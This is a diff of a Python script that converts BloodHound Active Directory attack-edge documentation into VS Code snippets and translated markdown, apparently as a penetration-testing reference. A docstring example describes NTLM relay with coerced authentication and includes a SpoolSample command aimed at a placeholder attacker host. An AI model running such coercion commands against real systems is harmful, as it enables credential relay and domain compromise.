@@ -1,196 +1,358 @@
 # /// script
 # requires-python = ">=3.10"
 # dependencies = [
-#     "pyyaml",
+#   "googletrans==4.0.0rc1",
 # ]
 # ///
 
-import os
 import json
-import sys
-import yaml
 
-convertmap = {
-	"az-mg-directory-readwrite-all": "AZMGDirectoryReadWriteAll",
-	"az-global-admin": "AZGlobalAdmin",
-	"get-changes-in-filtered-set": "GetChangesInFilteredSet",
-	"spoof-sid-history": "SpoofSidHistory",
-	"az-managed-identity": "AZManagedIdentity",
-	"dump-smsa-password": "DumpSmsaPassword",
-	"nt-auth-store-for": "NTAuthStoreFor",
-	"hosts-ca-service": "HostsCaService",
-	"az-owns": "AZOwns",
-	"all-extended-rights": "AllExtendedRights",
-	"az-add-members": "AZAddMembers",
-	"remote-interactive-logon-right": "RemoteInteractiveLogonRight",
-	"gp-link": "GpLink",
-	"trusted-for-nt-auth": "TrustedForNtAuth",
-	"az-key-vault-contributor": "AZKeyVaultContributor",
-	"read-laps-password": "ReadLapsPassword",
-	"dc-sync": "DcSync",
-	"dc-for": "DcFor",
-	"write-spn": "WriteSpn",
-	"local-to-computer": "LocalToComputer",
-	"az-mg-app-role-assignment-readwrite-all": "AZMGAppRoleAssignmentReadWriteAll",
-	"az-mg-grant-app-roles": "AZMGGrantAppRoles",
-	"overview": "Overview",
-	"manage-certificates": "ManageCertificates",
-	"az-get-secrets": "AZGetSecrets",
-	"az-mg-group-member-readwrite-all": "AZMGGroupMemberReadWriteAll",
-	"coerce-to-tgt": "CoerceToTgt",
-	"oid-group-link": "OIDGroupLink",
-	"az-get-keys": "AZGetKeys",
-	"az-aks-contributor": "AZAKSContributor",
-	"az-avere-contributor": "AZAvereContributor",
-	"az-user-access-administrator": "AZUserAccessAdministrator",
-	"az-runs-as": "AZRunsAs",
-	"az-contains": "AZContains",
-	"az-scoped-to": "AZScopedTo",
-	"adcs-esc9b": "ADCSESC9B",
-	"az-node-resource-group": "AZNodeResourceGroup",
-	"az-mg-service-principal-endpoint-readwrite-all": "AZMGServicePrincipalEndpointReadWriteAll",
-	"adcs-esc4": "ADCSESC4",
-	"write-owner": "WriteOwner",
-	"write-account-restrictions": "WriteAccountRestrictions",
-	"az-mg-add-secret": "AZMGAddSecret",
-	"az-privileged-role-admin": "AZPrivilegedRoleAdmin",
-	"adcs-esc9a": "ADCSESC9A",
-	"az-app-admin": "AZAppAdmin",
-	"adcs-esc1": "ADCSESC1",
-	"az-mg-application-readwrite-all": "AZMGApplicationReadWriteAll",
-	"contains-identity": "ContainsIdentity",
-	"owns": "Owns",
-	"az-add-secret": "AZAddSecret",
-	"az-mg-role-management-readwrite-directory": "AZMGRoleManagementReadWriteDirectory",
-	"az-vm-admin-login": "AZVMAdminLogin",
-	"az-automation-contributor": "AZAutomationContributor",
-	"add-key-credential-link": "AddKeyCredentialLink",
-	"can-ps-remote": "CanPSRemote",
-	"add-allowed-to-act": "AddAllowedToAct",
-	"has-trust-keys": "HasTrustKeys",
-	"write-gp-link": "WriteGpLink",
-	"adcs-esc3": "ADCSESC3",
-	"az-mg-add-owner": "AZMGAddOwner",
-	"issued-signed-by": "IssuedSignedBy",
-	"gpo-applies-to": "GpoAppliesTo",
-	"generic-write": "GenericWrite",
-	"cross-forest-trust": "CrossForestTrust",
-	"can-rdp": "CanRDP",
-	"az-add-owner": "AZAddOwner",
-	"write-pki-name-flag": "WritePKINameFlag",
-	"read-gmsa-password": "ReadGMSAPassword",
-	"add-self": "AddSelf",
-	"traversable-edges": "TraversableEdges",
-	"az-execute-command": "AZExecuteCommand",
-	"az-logic-app-contributor": "AZLogicAppContributor",
-	"contains": "Contains",
-	"propagates-aces-to": "PropagatesACEsTo",
-	"published-to": "PublishedTo",
-	"generic-all": "GenericAll",
-	"adcs-esc6b": "ADCSESC6B",
-	"synced-to-ad-user": "SyncedToADUser",
-	"same-forest-trust": "SameForestTrust",
-	"sync-laps-password": "SyncLapsPassword",
-	"enroll-on-behalf-of": "EnrollOnBehalfOf",
-	"write-pki-enrollment-flag": "WritePKIEnrollmentFlag",
-	"adcs-esc6a": "ADCSESC6A",
-	"synced-to-entra-user": "SyncedToEntraUser",
-	"az-contributor": "AZContributor",
-	"has-sid-history": "HasSIDHistory",
-	"allowed-to-act": "AllowedToAct",
-	"allowed-to-delegate": "AllowedToDelegate",
-	"get-changes": "GetChanges",
-	"az-member-of": "AZMemberOf",
-	"write-dacl": "WriteDACL",
-	"root-ca-for": "RootCAFor",
-	"az-get-certificates": "AZGetCertificates",
-	"can-apply-gpo": "CanApplyGPO",
-	"enterprise-ca-for": "EnterpriseCAFor",
-	"force-change-password": "ForceChangePassword",
-	"az-vm-contributor": "AZVMContributor",
-	"add-member": "AddMember",
-	"member-of-local-group": "MemberOfLocalGroup",
-	"az-cloud-app-admin": "AZCloudAppAdmin",
-	"enroll": "Enroll",
-	"az-mg-grant-role": "AZMGGrantRole",
-	"sql-admin": "SQLAdmin",
-	"az-mg-group-readwrite-all": "AZMGGroupReadWriteAll",
-	"az-privileged-auth-admin": "AZPrivilegedAuthAdmin",
-	"execute-dcom": "ExecuteDCOM",
-	"admin-to": "AdminTo",
-	"az-reset-password": "AZResetPassword",
-	"extended-by-policy": "ExtendedByPolicy",
-	"adcs-esc10b": "ADCSESC10B",
-	"has-session": "HasSession",
-	"az-has-role": "AZHasRole",
-	"adcs-esc13": "ADCSESC13",
-	"manage-ca": "ManageCA",
-	"adcs-esc10a": "ADCSESC10A",
-	"abuse-tgt-delegation": "AbuseTGTDelegation",
-	"az-website-contributor": "AZWebsiteContributor",
-	"az-owner": "AZOwner",
-	"golden-cert": "GoldenCert",
-	"delegated-enrollment-agent": "DelegatedEnrollmentAgent",
-	"az-mg-add-member": "AZMGAddMember",
-	"get-changes-all": "GetChangesAll",
-	"member-of": "MemberOf"
+
+'''
+Example of technique_props structure:
+{
+    "key": null,
+    "ref": null,
+    "props": {
+        "children": [
+            {
+                "type": {
+                    "propTypes": {}
+                },
+                "key": null,
+                "ref": null,
+                "props": {
+                    "variant": "body2",
+                    "children": "1: Start the Relay Server The NTLM relay can be executed with Inveigh."
+                },
+                "_owner": null,
+                "_store": {}
+            },
+            {
+                "type": {
+                    "propTypes": {}
+                },
+                "key": null,
+                "ref": null,
+                "props": {
+                    "variant": "body2",
+                    "children": [
+                        "2: Coerce the Target Computer Several coercion methods are documented here:",
+                        " ",
+                        {
+                            "type": "a",
+                            "key": null,
+                            "ref": null,
+                            "props": {
+                                "href": "https://github.com/p0dalirius/windows-coerced-authentication-methods",
+                                "children": "Windows Coerced Authentication Methods"
+                            },
+                            "_owner": null,
+                            "_store": {}
+                        },
+                        ". Examples of tools include:",
+                        {
+                            "type": "a",
+                            "key": null,
+                            "ref": null,
+                            "props": {
+                                "href": "https://github.com/leechristensen/SpoolSample",
+                                "children": "SpoolSample"
+                            },
+                            "_owner": null,
+                            "_store": {}
+                        },
+                        {
+                            "type": "a",
+                            "key": null,
+                            "ref": null,
+                            "props": {
+                                "href": "https://github.com/topotam/PetitPotam",
+                                "children": "PetitPotam"
+                            },
+                            "_owner": null,
+                            "_store": {}
+                        },
+                        "To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe \"VICTIM_IP\" \"ATTACKER_NETBIOS@PORT/file.txt\""
+                    ]
+                },
+                "_owner": null,
+                "_store": {}
+            }
+        ]
+    },
+    "_owner": null,
+    "_store": {}
 }
+'''
 
-def get_markdown_header(lines):
-    title = lines[1].replace("title: ", "").strip()
-    description = lines[2].replace("description: ", "").strip()
-    if description == "---":
-        return (title, "")
-    return (title, description)
+
+
+def recursive_process_react_element_json(props):
+    # 递归处理 props 以及其中的 props children 
+    # 将内容转换为 markdown 格式
+    if isinstance(props, dict):
+        if "props" in props:
+            # operating all kinds of elements
+            if "type" in props.keys() and props["type"] == "a":
+                return f"[{props['props']['children']}]({props['props']['href']})"
+            if "href" in props["props"].keys() and props["props"]["href"] != "":
+                return f"[{props['props']['children']}]({props['props']['href']})"
+            if "type" in props.keys() and props["type"] == "b":
+                return f"- {props['props']['children']}"
+            if "type" in props.keys() and props["type"] == "br":
+                return "\n"
+            if "component" in props["props"].keys() and props["props"]["component"] == "pre":
+                return f"\n```sh\n{props['props']['children']}\n```"
+            if "component" in props["props"].keys() and props["props"]["component"] == "code":
+                return f"`{props['props']['children']}`"
+            if "component" in props["props"].keys() and props["props"]["component"] == "span":
+                return f"- {props['props']['children']}"
+            if "variant" in props["props"].keys() and props["props"]["variant"] == "body1":
+                return f" \n**{props['props']['children'].strip()}**\n "
+            return recursive_process_react_element_json(props["props"])
+        if "children" in props:
+            if isinstance(props["children"], str):
+                # 处理字符串类型的 children
+                return props["children"]
+            elif isinstance(props["children"], list):
+                return [recursive_process_react_element_json(child) for child in props["children"]]
+            elif isinstance(props["children"], dict):
+                print("dict detected", json.dumps(props["children"], ensure_ascii=False))
+                return recursive_process_react_element_json(props["children"])
+        else:
+            return props
+    elif isinstance(props, str):
+        return f"{props}"
+    elif isinstance(props, list):
+        return [recursive_process_react_element_json(item) for item in props]
+
+def convert_array_in_tree_to_single_string(data):
+    # 将递归数组转换为字符串列表
+    if data is None:
+        print("None detected")
+        return ""
+    if isinstance(data, str):
+        return data
+    elif isinstance(data, list):
+        print("list detected", data)
+        string = ""
+        for i in data:
+            string += convert_array_in_tree_to_single_string(i)
+        return string
+    elif isinstance(data, dict):
+        print("dict detected", data)
+        if data != {}:
+            print("dict not empty")
+        return ""
+
+
+def parse_abuse(name, platform, technique_props, desc):
+    print(f"detecting {platform} abuse for {name}...")
+    print(json.dumps(technique_props, indent=4, ensure_ascii=False))
+    data = recursive_process_react_element_json(technique_props)
+    if platform == "common":
+        body = [f"To Abuse '{name}' commonly: "]
+    else:
+        body = [f"To Abuse '{name}' on {platform}: "]
+    print(f"data: {data}")
+    # parse data to string list body
+    if isinstance(data, str):
+        body.append(data)
+    elif isinstance(data, list):
+        for item in data:
+            curent_str = convert_array_in_tree_to_single_string(item)
+            curent_str = curent_str.replace("$", "\$")
+            for line in curent_str.split("\n"):
+                if line != "":
+                    body.append(line)
+            print(f"current string: {curent_str} to {body}")
+    
+    for i in range(len(body)):
+        if "No abuse information available for this node type." in body[i]:
+            body[i] = "Too much abuse techniques, please refer to the original document for details"
+        body[i] = body[i].replace("WE_CONTROLLED", "controlled object").replace("OUR_TARGET", "target object")
+        body[i] = body[i].replace("``` ", "```\n")
+    print(f"body: {body}")
+    return {
+        f"{name} {platform} abuse (bloodhound)": {
+            "description": desc.replace("WE_CONTROLLED", "controlled object").replace("OUR_TARGET", "target object"),
+            "prefix": f"{name}",
+            "body": body,
+        }
+    }
+
+
+def parse_technique(technique):
+    technique_name = technique["technique"]
+    linux_abuse = technique.get("linux", {})
+    windows_abuse = technique.get("windows", {})
+    common = technique.get("abuse", {})
+    print(f"Parsing {technique_name}...")
+    snippets = {}
+    
+    general = technique.get("general", {})
+    print(f"Technique description parsing {json.dumps(general, indent=4, ensure_ascii=False)}")
+    desc = convert_array_in_tree_to_single_string(recursive_process_react_element_json(general))
+    print(f"Technique description: {desc}")
+    
+    if linux_abuse != {}:
+        if isinstance(linux_abuse, list):
+            for item in linux_abuse:
+                overTarget = item[0]
+                react_element = item[1]
+                print(f"start processing {technique_name} over {overTarget} in linux")
+                snippets.update(parse_abuse(f"{technique_name} over {overTarget}", "linux", react_element, desc))
+        else:
+            snippets.update(parse_abuse(technique_name, "linux", linux_abuse, desc))
+    else:
+        print(f"Skipping {technique_name} due to missing linux abuse info")
+    if windows_abuse != {}:
+        if isinstance(windows_abuse, list):
+            for item in windows_abuse:
+                overTarget = item[0]
+                react_element = item[1]
+                print(f"start processing {technique_name} over {overTarget} in windows")
+                snippets.update(parse_abuse(f"{technique_name} over {overTarget}", "windows", react_element, desc))
+        else:
+            snippets.update(parse_abuse(technique_name, "windows", windows_abuse, desc))
+    else:
+        print(f"Skipping {technique_name} due to missing windows abuse info")
+    if common != {}:
+        snippets.update(parse_abuse(technique_name, "common", common, desc))
+        print("Common",common)
+    else:
+        print(f"Skipping {technique_name} due to missing common abuse info")
+    return snippets
+
+
+from googletrans import Translator
+def translate_text(text, dest='zh-CN'): # en
+    translator = Translator()
+    translation = translator.translate(text, dest)
+    return translation.text
+
+def get_technique_description(technique):
+    technique_name = technique["technique"]
+    general = technique.get("general", {})
+    print(f"Technique description parsing {json.dumps(general, indent=4, ensure_ascii=False)}")
+    desc = convert_array_in_tree_to_single_string(recursive_process_react_element_json(general))
+    print(f"Technique description: {desc}")
+    desc = desc.replace("WE_CONTROLLED", "controlled object").replace("OUR_TARGET", "target object")
+    print(desc)
+    trans_desc = translate_text(desc)
+    final_desc = f"{desc}\n\n{trans_desc}"
+    print("finally result of descriptions: \n",final_desc)
+    
+    linux_abuse = technique.get("linux", {})
+    windows_abuse = technique.get("windows", {})
+    common = technique.get("abuse", {}) 
+    
+    body = [
+        f"# {technique_name}",
+        ""
+        f"## Description",
+        ""
+        f"{final_desc}",
+        "",
+        "## Abuse Info",
+        ""
+    ]
+    
+    if linux_abuse != {}:
+        body.append(f"")
+        if isinstance(linux_abuse, list):
+            for item in linux_abuse:
+                overTarget = item[0]
+                react_element = item[1]
+                print(f"start processing {technique_name} over {overTarget} in linux")
+                obj = parse_abuse(f"{technique_name} over {overTarget}", "linux", react_element, desc)
+                for key in obj:
+                    data = obj[key]["body"]
+                    title = data[0]
+                    body.append(f"### {title}")
+                    body += data[1:]
+                    body.append(f"")
+        else:
+            obj = parse_abuse(f"{technique_name}", "linux", linux_abuse, desc)
+            for key in obj:
+                data = obj[key]["body"]
+                title = data[0]
+                body.append(f"### {title}")
+                body += data[1:]
+                body.append(f"")
+            # snippets.update(parse_abuse(technique_name, "linux", linux_abuse, desc))
+    else:
+        print(f"Skipping {technique_name} due to missing linux abuse info")
+    if windows_abuse != {}:
+        body.append(f"")
+        if isinstance(windows_abuse, list):
+            for item in windows_abuse:
+                overTarget = item[0]
+                react_element = item[1]
+                print(f"start processing {technique_name} over {overTarget} in windows")
+                # snippets.update(parse_abuse(f"{technique_name} over {overTarget}", "windows", react_element, desc))
+                obj = parse_abuse(f"{technique_name} over {overTarget}", "windows", react_element, desc)
+                for key in obj:
+                    data = obj[key]["body"]
+                    title = data[0]
+                    body.append(f"### {title}")
+                    body += data[1:]
+                    body.append(f"")
+        else:
+            # snippets.update(parse_abuse(technique_name, "windows", windows_abuse, desc))
+            obj = parse_abuse(technique_name, "windows", windows_abuse, desc)
+            for key in obj:
+                data = obj[key]["body"]
+                title = data[0]
+                body.append(f"### {title}")
+                body += data[1:]
+                body.append(f"")
+    else:
+        print(f"Skipping {technique_name} due to missing windows abuse info")
+    if common != {}:
+        # snippets.update(parse_abuse(technique_name, "common", common, desc))
+        obj = parse_abuse(technique_name, "common", common, desc)
+        for key in obj:
+            data = obj[key]["body"]
+            title = data[0]
+            body.append(f"### {title}")
+            body += data[1:]
+            body.append(f"")
+        print("Common",common)
+    else:
+        print(f"Skipping {technique_name} due to missing common abuse info")
+    return {
+        f"{technique_name}" : {
+            "description": final_desc,
+            "extra": body,
+        },
+    }
+
 
 def main():
-    output = open("./blood.json", "w", encoding="utf-8")
+    output = open("blood.json", "w", encoding="utf-8")
     output_data = {}
     
-    loc = "./docs/docs/resources/edges/"
-    for dir in os.listdir(loc):
-        dir_path = os.path.join(loc, dir)
-        print(f"Processing directory: {dir_path}")
-        with open(dir_path, "r", encoding="utf-8") as file:
-            contents = file.readlines()
-            technique, description = get_markdown_header(contents)
-            print(f"Technique: {technique}, Description: {description}")
-            
-            start = 0
-            end = len(contents)
-            for i in range(0, len(contents)):
-                line = contents[i]
-                if not line:
-                    continue
-                if "## Abuse Info" in line:
-                    start = i + 1
-                if "## opsec" in line.lower() or '## psec ' in line.lower() or '**opsec ' in line.lower() or 'Opsec Considerations' in line:
-                    end = i 
-                contents[i] = line.replace("\n", "")
-                
-            contents = contents[start:end]
-            final_content = [line for line in contents if line.strip() != ""]
-            if start == 0: 
-                print(f"Skipping {technique} due to missing abuse info")
-                continue
-            print(f"Abuse content length: {final_content}")
-            
-            output_data[technique] = {
-                "prefix": technique,
-                "description": description[1: -1],
-                "body": [ 
-                    f"Abuse Edge {technique} is {description[1: -1]}", 
-                    *final_content
-                ]
-            }
-                
-    print("Converting to vscode snippets format...")
+    input_file = open("./dump/result.json", "r", encoding="utf-8")
+    input_data = json.load(input_file)
+    
+    for technique in input_data:
+        output_data |= parse_technique(technique)
+
     json.dump(output_data, output, ensure_ascii=False, indent=4)
     output.close()
-    print("Conversion complete. Output written to blood.json, entry count:", len(output_data))
-
+    input_file.close()
+    
+    input_file = open("./dump/result.json", "r", encoding="utf-8")
+    input_data = json.load(input_file)
+    output = open("blood_desc.json", "w", encoding="utf-8")
+    output_data = {} # clean up
+    for technique in input_data:
+        output_data |= get_technique_description(technique)
+    json.dump(output_data, output, ensure_ascii=False, indent=4)
+    output.close()
+    input_file.close()
 
 if __name__ == "__main__":
     main()
-
-
